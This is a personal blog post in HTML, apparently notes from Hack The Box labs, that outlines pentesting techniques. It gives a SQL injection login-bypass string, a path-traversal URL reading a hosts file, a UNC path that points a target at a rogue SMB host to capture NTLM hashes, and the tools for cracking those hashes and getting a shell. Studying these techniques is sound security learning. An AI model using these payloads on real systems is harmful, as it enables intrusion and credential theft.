<!DOCTYPE html>
<!--
    Type on Strap jekyll theme v2.4.3
    Theme free for personal and commercial use under the MIT license
    https://github.com/sylhare/Type-on-Strap/blob/master/LICENSE
-->
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=5">

    <!-- Theme Mode-->
    
    <script>
        const isAutoTheme = true;
        document.documentElement.setAttribute('data-theme', sessionStorage.getItem('theme'))
    </script>
    

    <!-- Main JS (navbar.js, katex_init.js and masonry_init.js)-->
    <script defer src="/assets/js/main.min.js"></script>

    <!-- CSS -->
    <link rel="stylesheet" href="/assets/css/main.css">

    <!--Favicon-->
    <link rel="shortcut icon" href="/assets/img/avatars/me-100x100.png" type="image/x-icon">

    

    <!-- KaTeX 0.15.2 -->
    
    <script defer src="/assets/js/vendor/katex.min.js"></script>
    <script defer src="/assets/js/vendor/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
    

    <!-- Mermaid 9.1.1 -->
    
    <script defer src="/assets/js/vendor/mermaid.min.js" onload="mermaid.initialize({
      startOnLoad:true,
      theme: 'default',
    });"></script>
    

    <!-- Simple Jekyll Search 1.10.0 -->
    <script src="/assets/js/vendor/simple-jekyll-search.min.js" type="text/javascript"></script>

    <!-- Google Analytics / Cookie Consent -->
    <script>
      const cookieName = 'cookie-notice-dismissed-https://www.agalera.eu';
      const isCookieConsent = 'false';
      const analyticsName = 'UA-126206451-1';
      const analyticsNameGA4 = '';
    </script>

    
    
        <!-- old google analytics -->
        <!--
        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-126206451-1"></script>
        <script async src='https://www.google-analytics.com/analytics.js'></script>
        <script>
        // disable GA for localhost
        const isProduction = window.location.host.includes("agalera.eu")
        if (!isProduction) { 
          console.log(`Disabling google analytics for UA-126206451-1`)
          window['ga-disable-UA-126206451-1'] = true;
        }
        </script>
        -->
        <!-- Google tag (gtag.js) -->
        <script async src="https://www.googletagmanager.com/gtag/js?id=G-S8VGYBN25C"></script>
        <script>
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());

          gtag('config', 'G-S8VGYBN25C');
        </script>        
    

    <!-- seo tags -->
    <meta property="og:image" content="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg">
    
    <meta property="og:type" content="website" />
    
    <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Pentesting techniques | Adrian Galera blog</title>
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="Pentesting techniques" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="I keep this page as a reference to the different pentesting techniques I have learnt in https://www.hackthebox.com/" />
<meta property="og:description" content="I keep this page as a reference to the different pentesting techniques I have learnt in https://www.hackthebox.com/" />
<link rel="canonical" href="https://www.agalera.eu/pentesting-techniques/" />
<meta property="og:url" content="https://www.agalera.eu/pentesting-techniques/" />
<meta property="og:site_name" content="Adrian Galera blog" />
<meta property="og:image" content="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-12-12T00:00:00+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" />
<meta property="twitter:title" content="Pentesting techniques" />
<script type="application/ld+json">
{"image":"https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg","url":"https://www.agalera.eu/pentesting-techniques/","headline":"Pentesting techniques","@type":"BlogPosting","datePublished":"2022-12-12T00:00:00+01:00","description":"I keep this page as a reference to the different pentesting techniques I have learnt in https://www.hackthebox.com/","dateModified":"2022-12-12T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.agalera.eu/pentesting-techniques/"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


    <!-- RSS -->
    <link rel="alternate" type="application/atom+xml" title="Adrian Galera blog" href="https://www.agalera.eu/feed.xml"/>
    <link type="application/atom+xml" rel="alternate" href="https://www.agalera.eu/feed.xml" title="Adrian Galera blog" />

    <!-- Twitter Cards -->
    <meta name="twitter:title" content="Pentesting techniques">
    <meta name="twitter:description" content="I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting techniques I am learning.Fingerprin...">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg">
    <meta name="twitter:image:alt" content="Pentesting techniques">
</head>

  <body>
    <header class="site-header">

    <!-- Logo and title -->
	<div class="branding">
        
		<a href="/">
			<img alt="logo img" class="avatar" src="/assets/img/avatars/me-100x100.png" />
		</a>
        
        <a class="site-title" aria-label="Adrian Galera blog" href="/">
        Adrian Galera blog
		</a>
	</div>

    <!-- Toggle menu -->
    <nav class="clear">
    <a aria-label="pull" id="pull" class="toggle" href="#">
    <i class="fas fa-bars fa-lg"></i>
    </a>

    <!-- Menu -->
    <ul class="hide">
        

        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            <li class="separator"> | </li>
            <li>
                <a class="clear" aria-label="Search" title="Search" href="/search/">
                     <i class="fas fa-search" aria-hidden="true"></i>
                    
                </a>
            </li>
            
            
        
            
            <li class="separator"> | </li>
            <li>
                <a class="clear" aria-label="Tags" title="Tags" href="/tags/">
                     <i class="fas fa-tags" aria-hidden="true"></i>
                    
                </a>
            </li>
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
        
        
        <li class="separator"> | </li>
        <li><a id="theme-toggle" title="Pentesting techniques " aria-label="Pentesting techniques" onclick="themeToggle()"></a></li>
        
    </ul>

	</nav>
</header>

    <div class="content">
      <article class="feature-image" >
  <header id="main" style="">
    <div class="title-padder">
      
      <h1 id="Pentesting+techniques" class="title">Pentesting techniques</h1>
      


<div class="post-info">
    <p class="meta">
      
      
      December 12, 2022
    </p></div>

      
    </div>
  </header>

  <section class="post-content">
  
      <p>I have started playing around in <a href="https://www.hackthebox.com/">https://www.hackthebox.com</a> platform and I’ll use this article to save all the pentesting techniques I am learning.</p>

<p><!--more--></p>

<h2 id="fingerprinting">Fingerprinting</h2>

<p>Once we got the target IP, we must start identifying which services is running in that machine. In order to do, you can use <code class="language-plaintext highlighter-rouge">nmap</code> which performs port scanning and is able to identify OS, services and service versions.</p>

<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>

<h2 id="directory-brute-force">Directory brute force</h2>

<p>This is a technique useful to detect available paths for a web application. Also known as dir busting.</p>

<p>The technique consist in using a list of words and try all the combinations in the dictionary to see if the web server returns a positive (200 OK) answer to the page. If so, we discover a page in that path.</p>

<p>The tools to perform this is <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>

<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>

<h2 id="sql-injections">SQL Injections</h2>

<p>If the SQL queries are poorly built, it means that they are susceptible to SQL injections. If the user input is not sanitised, we can break up SQL queries that will cause problems, such as bypassing a login page.</p>

<p>A typical SQL query for a login page can look like this:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">members</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">'admin'</span>
</code></pre></div></div>

<p>If the input values are not sanitised, we can break the query by putting a comment character to comment the part of query that does the password checking:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">members</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span> <span class="o">#</span><span class="s1">' AND password = '</span><span class="n">kjdfjklsdf</span><span class="s1">'
</span></code></pre></div></div>

<p>Now the query becomes:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">members</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span>
</code></pre></div></div>

<p>therefore, the query is no longer checking for password and the login page is bypassed.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username: admin'#
password: admin123 (any password will do the trick)
</code></pre></div></div>

<p>You can find more SQL injections here: <a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/</a></p>

<h2 id="local-file-include-lfi">Local File Include (LFI):</h2>

<p>Abuse of file loading capability (for instance PHP include function) to show a local file in the browser:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts
</code></pre></div></div>

<h2 id="remote-file-include-rfi">Remote File Include (RFI):</h2>

<p>Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts.</p>

<p>This can be use to force the target make a call to a compromised host in the same network and captura the credentials challenge:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://unika.htb/index.php?page=\\10.1.2.3\blabla\
</code></pre></div></div>

<h2 id="ntlm">NTLM</h2>

<p>Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.</p>

<p>In order to mess with it, you might use the <a href="https://github.com/lgandx/Responder">responder tool</a></p>

<p>The idea to bypass the NTLM is to force the target authenticate against a rogue SMB server (provided by <code class="language-plaintext highlighter-rouge">responder</code> tool). This tool will capture the authentication challenge hash and then you can use <code class="language-plaintext highlighter-rouge">john</code> tool to compare the hash with a dictionary to see if any entry matches.</p>

<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>

<h2 id="shell-access">Shell access</h2>

<p>Once you know the user passwword by using <code class="language-plaintext highlighter-rouge">responder</code> and <code class="language-plaintext highlighter-rouge">john</code> tool, you can use <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> app to gain access to the target machine.</p>

<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>

    
  </section>

  <!-- Social media shares -->
  

<div class="share-buttons">
    <ul class="share-buttons">
        <li class="meta">Share</li>
        
        <li>
            <a href="https://www.facebook.com/sharer/sharer.php?u=https://www.agalera.eu/pentesting-techniques/" target="_blank"
               title=" Facebook">
                <i class="fab fa-facebook-square fa-2x" aria-hidden="true"></i>
                <span class="sr-only">Share on Facebook</span>
            </a>
        </li>
         
        <li>
            <a href="https://twitter.com/intent/tweet?text=Pentesting+techniques%20https%3A%2F%2Fwww.agalera.eu%2Fpentesting-techniques%2F"
               target="_blank" title="">
                <i class="fab fa-twitter-square fa-2x" aria-hidden="true"></i>
                <span class="sr-only">Tweet</span>
            </a>
        </li>
         
        <li>
            <a href="https://www.tumblr.com/share?v=3&u=https://www.agalera.eu/pentesting-techniques/&quote=Pentesting+techniques%20%7C%20Adrian+Galera+blog&s="
               target="_blank" title=" Tumblr">
                <i class="fab fa-tumblr-square fa-2x" aria-hidden="true"></i>
                <span class="sr-only">Share on Tumblr</span>
            </a>
        </li>
         
        <li>
            <a href="https://pinterest.com/pin/create/button/?url=https://www.agalera.eu/pentesting-techniques/&media=https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg$description=I+have+started+playing+around+in+https%3A%2F%2Fwww.hackthebox.com+platform+and+I%E2%80%99ll+use+this+article+to+save+all+the+pentesting+techniques+I+am+learning.%0A%0A%0A%0A"
               target="_blank" title="">
                <i class="fab fa-pinterest-square fa-2x" aria-hidden="true"></i>
                <span class="sr-only">Pin it</span>
            </a>
        </li>
          
        <li>
            <a href="https://www.reddit.com/submit?url=https://www.agalera.eu/pentesting-techniques/&title=Pentesting+techniques%20%7C%20Adrian+Galera+blog"
               target="_blank" title=" Reddit">
                <i class="fab fa-reddit-square fa-2x" aria-hidden="true"></i>
                <span class="sr-only">Share on Reddit</span>
            </a>
        </li>
         
        <li>
            <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.agalera.eu/pentesting-techniques/&title=Pentesting+techniques%20%7C%20Adrian+Galera+blog&summary=&source=https://www.agalera.eu/pentesting-techniques/"
               target="_blank" title=" LinkedIn">
                <i class="fab fa-linkedin fa-2x" aria-hidden="true"></i>
                <span class="sr-only">Share on LinkedIn</span>
            </a>
        </li>
          
        <li>
            <a href="mailto:?subject=Pentesting techniques%20%7C%20Adrian Galera blog&body=https://www.agalera.eu/pentesting-techniques/"
               target="_blank" title="">
                <i class="fas fa-envelope-square fa-2x" aria-hidden="true"></i>
                <span class="sr-only">Email</span></a>
        </li>
        
    </ul>
</div>




   <!-- Tag list -->
  
  


  <div class="tag-list">
    <ul>
      
        <li class="meta">Tags</li>
      

      
        <li><a class="button" href="/tags#hack-the-box">
          <p><i class="fas fa-tag fa-fw fa-sm"></i> hack-the-box</p>
        </a></li>
      
        <li><a class="button" href="/tags#hacking">
          <p><i class="fas fa-tag fa-fw fa-sm"></i> hacking</p>
        </a></li>
      
        <li><a class="button" href="/tags#linux">
          <p><i class="fas fa-tag fa-fw fa-sm"></i> linux</p>
        </a></li>
      
        <li><a class="button" href="/tags#pentesting">
          <p><i class="fas fa-tag fa-fw fa-sm"></i> pentesting</p>
        </a></li>
      
    </ul>
  </div>



</article>

<!-- Post navigation -->

<div id="post-nav">
    
    <div id="previous-post">
        <a alt="Python app structure" href="/python-app-structure/">
            <p>Previous post</p>
            Python app structure
        </a>
    </div>
    

    
    <div id="next-post">
        <a alt="Password protection for Github Pages" href="/github-pages-password/">
            <p>Next post</p>
            Password protection for Github Pages
        </a>
    </div>
    
</div>



<!--Utterances-->


<!-- Cusdis -->


<!-- Disqus -->


<!-- To change color of links in the page -->
<style>
  header#main {
      background-size: cover;
      background-repeat: no-repeat;
      background-position: center;
  }

  

  
  header#main { background-image: url('/assets/img/posts/hack-the-box-cheatsheet/featured.jpg'); }
  
</style>

    </div>
    <footer class="site-footer">
    <p class="text">
        </p>
            <div class="footer-icons">
                <ul>
                <!-- Social icons from Font Awesome, if enabled -->
                
<li>
    <a feed.xml href="/feed.xml"
       title="Follow RSS feed"
       target="_blank">
        <span class="fa-stack fa-lg">
            <i class="fas fa-circle fa-stack-2x"></i>
            <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
        </span>
    </a>
</li>



    

    

    

    

    

    

    
        
        
        
        
        <li>
            <a href="https://github.com/adriangalera"
               title="Follow on Github"
               target="_blank"
               rel="noopener">
            <span class="fa-stack fa-lg">
              <i class="fas fa-circle fa-stack-2x"></i>
              <i class="fab fa-github fa-stack-1x fa-inverse"></i>
            </span>
            </a>
        </li>
    

    

    

    

    

    

    
        
        
        
        
        <li>
            <a href="https://www.linkedin.com/in/adriangalera"
               title="Follow on Linkedin"
               target="_blank"
               rel="noopener">
            <span class="fa-stack fa-lg">
              <i class="fas fa-circle fa-stack-2x"></i>
              <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
            </span>
            </a>
        </li>
    

    
        
        
        
        
        <li>
            <a href="mailto:adrian.galera.87@gmail.com"
               title="Follow on Mail"
               target="_blank"
               rel="noopener">
            <span class="fa-stack fa-lg">
              <i class="fas fa-circle fa-stack-2x"></i>
              <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
            </span>
            </a>
        </li>
    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    


                </ul>
            </div>
</footer>



  </body>
</html>
